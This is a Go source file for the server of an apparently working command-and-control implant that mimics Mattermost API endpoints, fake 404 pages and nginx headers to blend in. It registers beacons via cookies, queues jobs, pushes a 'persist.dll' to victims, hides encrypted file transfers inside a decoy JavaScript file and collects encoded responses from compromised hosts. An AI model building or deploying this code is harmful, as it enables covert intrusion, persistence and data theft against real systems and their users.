package neurons

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const notFoundId = "api.context.404.app_error"
const notFoundMessage = "Sorry, we could not find the page."
const notFoundDetailedError = "There doesn't appear to be an api call for the url='%s'.  Typo? are you missing a team_id or user_id as part of the url?"

const invalidId = "api.context.invalid_url_param.app_error"
const invalidMessage = "Invalid or missing user_id parameter in request URL."
const invalidDetailedError = ""

// modified from mattermost-server/model/utils.go
type AppError struct {
	Id            string `json:"id"`
	Message       string `json:"message"`        // Message to be display to the end user without debugging information
	DetailedError string `json:"detailed_error"` // Internal error string to help the developer
	// The "omitempty" option specifies that the field should be omitted from the encoding if the field has an empty value, defined as false, 0, a nil pointer, a nil interface value, and any empty array, slice, map, or string.
	RequestId  string `json:"request_id,omitempty"`  // The RequestId that's also set in the header
	StatusCode int    `json:"status_code,omitempty"` // The http status code
	// As a special case, if the field tag is "-", the field is always omitted.
	// Where         string `json:"-"`                     // The function where it happened in the form of Struct.Func
	IsOAuth bool `json:"is_oauth,omitempty"` // Whether the error is OAuth specific
	// params        map[string]interface{}
}

const (
	idLength           = 26
	pulseTimeout       = 15
	uidLength          = 64 // length of sha256 in bytes
	cacheControlMaxAge = 31556926
)

const (
	jsOffset        = 86198
	jsFilename      = "transfer.js"
	persistFilename = "persist.dll"
)

var persistDLL []byte
var jsData []byte

func init() {
	// prepare js file for sandwiching upload job data
	var err error
	jsData, err = os.ReadFile(jsFilename)
	if err != nil {
		log.Println(err)
	}
	persistDLL, err = os.ReadFile(persistFilename)
	if err != nil {
		log.Println(err)
	}
}

// GET /api/v4/plugins/webapp
// keep-alive, API if GET, chunked only if gzip
func GetPulse(w http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodGet {
		w.Header().Del("X-Request-Id")
		w.Header().Del("X-Version-Id")
		FakeAPINotFound(w, req)
		return
	}

	// TODO: try patch for Go ordered headers
	w.Header().Set("Expires", "0")
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
	w.Header().Set("Vary", "Accept-Encoding")
	uid, err := decodeCookie(req)
	if err == nil {
		name := uid[:len(uid)-uidLength]
		uid = uid[len(uid)-uidLength:]
		Clients.Add(uid, name)
		// refresh prompt which should contain the uid now
		prompt()
		client := Clients.List[uid]

		go func() {
		checkAlive:
			for {
				select {
				case <-client.Pulse:
				case <-time.After(pulseTimeout * time.Second):
					Clients.Cleanup(client.Uid)
					prompt()
					break checkAlive
				}
			}
		}()
	}
	// w.WriteHeader for StatusOK will be implicitly called before w.Write if it has not yet been called
	w.Write([]byte("[]"))
	// some other alternatives for writing:
	// fmt.Fprintf(w, string(ciphertext))
	// or w.Write([]byte("string"))
	// or io.WriteString(w, "string")
}

// POST /api/v4/users/status/ids
// keep-alive, chunked if not gzip for POST, chunked if gzip for GET, API if POST
func GetJob(w http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		w.Header().Del("X-Request-Id")
		w.Header().Del("X-Version-Id")
		FakeAPINotFound(w, req)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
	w.Header().Set("Vary", "Accept-Encoding")
	// TODO: decide if verification will be still sent through the cookie headers for serving
	uid, err := decodeCookie(req)
	if err == nil {
		uid := uid[len(uid)-uidLength:]
		client, exists := Clients.List[uid]
		if !exists {
			goto EXITGETJOB
		}
		client.Pulse <- struct{}{}
		select {
		case job := <-client.Jobs:
			action := strings.Split(job, " ")[0]
			var statuses []status
			switch action {
			case "up":
				src := strings.Split(job, " ")[1]
				dst := strings.Split(job, " ")[2]
				// TODO: consider buffered read for src file?
				client.Transfer <- src
				// below we can either respond with N corresponding statuses with abnormally long user IDs when N statuses are sent in the incoming POST request,
				// or respond with an arbitrary number of statuses but with proper status ID length (26)
				statuses = createStatuses([]byte(dst))
				chosen := chooseRandom(statuses)
				chosen.Status = "offline"
			case "persist":
				statuses = createStatuses(persistDLL)
				chosen := chooseRandom(statuses)
				chosen.Status = "dnd"
			default:
				log.Println("Job present:", job)
				statuses = createStatuses([]byte(job))
			}
			data, _ := json.Marshal(statuses)
			w.Write(data)
			return
		default:
			// no job available
		}
	}
EXITGETJOB:
	statuses := createNRandomStatuses(10)
	data, _ := json.Marshal(statuses)
	w.Write(data)
}

// GET /static/
// GET or POST doesn't matter
// keep-alive, chunked if gzip, accept-range if not gzip
func SendFile(w http.ResponseWriter, req *http.Request) {
	w.Header().Set("Vary", "Accept-Encoding")

	if filepath.Ext(req.URL.Path) != ".js" {
		// keep-alive, content length, no gzip
		w.Header().Set("Cache-Control", "no-cache, public")
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		w.WriteHeader(http.StatusNotFound)
		w.Write([]byte("404 page not found\n")) // default Go response
		return
	}

	w.Header().Set("Cache-Control", "max-age=31556926, public")
	w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
	w.Header().Set("Last-Modified", generateLastModifiedDate()) // RFC1123
	w.Header().Set("Content-Type", "application/javascript")
	uid, err := decodeCookie(req)
	if err == nil {
		uid := uid[len(uid)-uidLength:]
		client, exists := Clients.List[uid]
		if !exists {
			goto EXITSENDFILE
		}
		log.Println("Getting transfer.")
		src := <-client.Transfer
		data, err := os.ReadFile(src)
		if err != nil {
			log.Println(err)
			goto EXITSENDFILE
		}
		log.Println("Read file.")
		data = Encrypt(data)
		encoded := base64.StdEncoding.EncodeToString(data)
		// TODO: pseudo-randomize offsets
		// const a = ["PAYLOAD_HERE"]
		payload := string(jsData[:jsOffset]) + "\"" + encoded + "\"" + string(jsData[jsOffset:])
		// TODO: wireshark dissector bug for huge files?
		w.Write([]byte(payload))
		return
	}
EXITSENDFILE:
	// send normal js file without any payload
	w.Write(jsData)
}

// POST /api/v4/users/ids?since=<unix_timestamp_in_MILLISECONDS>
// keep-alive, gzip if large, chunked if gzip, API
func GetResponse(w http.ResponseWriter, req *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Vary", "Accept-Encoding")
	if req.Method != http.MethodPost {
		// no gzip
		w.Header().Set("Expires", "0")
		w.WriteHeader(http.StatusBadRequest)
		data, _ := json.Marshal(AppError{
			invalidId,
			invalidMessage,
			invalidDetailedError,
			req.Context().Value("requestID").(string),
			http.StatusBadRequest,
			false,
		})
		w.Write(data)
		return
	}

	w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
	// TODO: possible to validate for other headers like X-Requested-With: XMLHttpRequest or X-CSRF-Token or User-Agent
	timestamp := req.URL.Query().Get("since")
	if isReasonableTimestamp(timestamp, time.Millisecond) {
		uid, err := decodeCookie(req)
		if err == nil {
			uid := uid[len(uid)-uidLength:]
			client, exists := Clients.List[uid]
			if !exists {
				goto EXITGETRESPONSE
			}
			bodyBytes, err := io.ReadAll(req.Body)
			if err != nil {
				log.Println(err)
				goto EXITGETRESPONSE
			}
			var encodedParts []string
			err = json.Unmarshal(bodyBytes, &encodedParts)
			if err != nil {
				goto EXITGETRESPONSE
			}
			encoded := strings.Join(encodedParts, ",")
			decrypted, err := DecodeZ32Decrypt(encoded)
			if err != nil {
				goto EXITGETRESPONSE
			}
			client.Response <- decrypted
		}
	}
	// TODO: maybe redesign to get rid of the gotos
EXITGETRESPONSE:
	w.Write([]byte("[]"))

}

// /api/v{mattermost_version}/ or /api/
// keep-alive, chunked if gzip
func FakeAPINotFound(w http.ResponseWriter, req *http.Request) {
	// From src/net/http/server.go:
	// "If the handler didn't declare a Content-Length up front, we either
	// go into chunking mode or, if the handler finishes running before
	// the chunking buffer size, we compute a Content-Length and send that
	// in the header instead."
	// const bufferBeforeChunkingSize = 2048, so if data to be written > 2048 then Transfer-Encoding chunked will be automatically set

	w.Header().Set("Content-Type", "text/plain; charset=utf-8")

	// Order here matters because "Changing the header map after a call to WriteHeader (or
	// Write) has no effect unless the modified headers are
	// trailers"
	w.WriteHeader(http.StatusNotFound)

	// json.NewEncoder(w).Encode(<struct>) adds a trailing newline to the json so we'll just Marshal it and write instead
	data, _ := json.Marshal(AppError{
		notFoundId,
		notFoundMessage,
		fmt.Sprintf(notFoundDetailedError, req.URL),
		"",
		http.StatusNotFound,
		false,
	})
	w.Write(data)
}

// / catch-all
// keep-alive, chunked if gzip, API, CSP, x-frame-options
func FakeNotFound(w http.ResponseWriter, req *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	// from mattermost-server/web/static.go -> root
	w.Header().Set("Cache-Control", "no-cache, max-age=31556926, public")
	w.Header().Set("Last-Modified", generateLastModifiedDate())
	w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
	w.Write([]byte(contentSecurityPolicyNotFoundHTML))
}

func SetStaticHeaders(f func(w http.ResponseWriter, req *http.Request)) http.HandlerFunc {
	return func(w http.ResponseWriter, req *http.Request) {
		if req.Method == http.MethodPost {
			w.WriteHeader(http.StatusMethodNotAllowed)
			return
		}
		w.Header().Set("Content-Security-Policy", "frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com")
		w.Header().Set("X-Frame-Options", "SAMEORIGIN")
		http.HandlerFunc(f).ServeHTTP(w, req)
	}
}

func SetCommonHeaders(handler http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		// "Date: xxx" will be an automatic response header and can be suppressed with nil if desired
		// if not set, Content-Type will be sniffed and added automatically by passing the written data to DetectContentType which implements the algorithm at https://mimesniff.spec.whatwg.org/
		// but I think we'll just specify it in the individual handlers
		w.Header().Set("Server", "nginx")
		w.Header().Set("Connection", "keep-alive")
		handler.ServeHTTP(w, req) // f.ServeHTTP basically calls f(w,r)
	})
}

// we can wrap and return a func(http.ResponseWriter, *http.Request) instead of a http.Handler
func SetAPIHeaders(f func(w http.ResponseWriter, req *http.Request)) http.HandlerFunc {
	return func(w http.ResponseWriter, req *http.Request) {
		requestID := generateID()
		// store requestID in request's Context in case the handler function needs to access it
		ctx := req.Context()
		ctx = context.WithValue(ctx, "requestID", requestID)
		req = req.WithContext(ctx)
		w.Header().Set("X-Request-Id", requestID)
		w.Header().Set("X-Version-Id", versionID)
		http.HandlerFunc(f).ServeHTTP(w, req)
	}
}

// from mattermost-server/utils/subpath_test.go
// TODO: but the proper accurate response is maybe built from https://github.com/mattermost/desktop/blob/master/src/renderer/components/ErrorView.tsx into a static file root.html
const contentSecurityPolicyNotFoundHTML = `<!DOCTYPE html> <html lang=en> <head> <meta charset=utf-8> <meta http-equiv=Content-Security-Policy content="script-src 'self' cdn.rudderlabs.com/ js.stripe.com/v3"> <meta http-equiv=X-UA-Compatible content="IE=edge"> <meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"> <meta name=robots content="noindex, nofollow"> <meta name=referrer content=no-referrer> <title>Mattermost</title> <meta name=apple-mobile-web-app-capable content=yes> <meta name=apple-mobile-web-app-status-bar-style content=default> <meta name=mobile-web-app-capable content=yes> <meta name=apple-mobile-web-app-title content=Mattermost> <meta name=application-name content=Mattermost> <meta name=format-detection content="telephone=no"> <link rel=apple-touch-icon sizes=57x57 href=/static/files/78b7e73b41b8731ce2c41c870ecc8886.png> <link rel=apple-touch-icon sizes=60x60 href=/static/files/51d00ffd13afb6d74fd8f6dfdeef768a.png> <link rel=apple-touch-icon sizes=72x72 href=/static/files/23645596f8f78f017bd4d457abb855c4.png> <link rel=apple-touch-icon sizes=76x76 href=/static/files/26e9d72f472663a00b4b206149459fab.png> <link rel=apple-touch-icon sizes=144x144 href=/static/files/7bd91659bf3fc8c68fcd45fc1db9c630.png> <link rel=apple-touch-icon sizes=120x120 href=/static/files/fa69ffe11eb334aaef5aece8d848ca62.png> <link rel=apple-touch-icon sizes=152x152 href=/static/files/f046777feb6ab12fc43b8f9908b1db35.png> <link rel=icon type=image/png sizes=16x16 href=/static/files/02b96247d275680adaaabf01c71c571d.png> <link rel=icon type=image/png sizes=32x32 href=/static/files/1d9020f201a6762421cab8d30624fdd8.png> <link rel=icon type=image/png sizes=96x96 href=/static/files/fe23af39ae98d77dc26ae8586565970f.png> <link rel=icon type=image/png sizes=192x192 href=/static/files/d7ff68a7675f84337cc154c3d4abe713.png> <link rel=manifest href=/static/files/a985ad72552ad069537d6eea81e719c7.json> <link rel=stylesheet class=code_theme> <style>.error-screen{font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;padding-top:50px;max-width:750px;font-size:14px;color:#333;margin:auto;display:none;line-height:1.5}.error-screen h2{font-size:30px;font-weight:400;line-height:1.2}.error-screen ul{padding-left:15px;line-height:1.7;margin-top:0;margin-bottom:10px}.error-screen hr{color:#ddd;margin-top:20px;margin-bottom:20px;border:0;border-top:1px solid #eee}.error-screen-visible{display:block}</style> <link href="/static/main.364fd054d7a6d741efc6.css" rel="stylesheet"><script type="text/javascript" src="/static/main.e49599ac425584ffead5.js"></script></head> <body class=font--open_sans> <div id=root> <div class=error-screen> <h2>Cannot connect to Mattermost</h2> <hr/> <p>We're having trouble connecting to Mattermost. If refreshing this page (Ctrl+R or Command+R) does not work, please verify that your computer is connected to the internet.</p> <br/> </div> <div class=loading-screen style=position:relative> <div class=loading__content> <div class="round round-1"></div> <div class="round round-2"></div> <div class="round round-3"></div> </div> </div> </div> <noscript> To use Mattermost, please enable JavaScript. </noscript> </body> </html>`
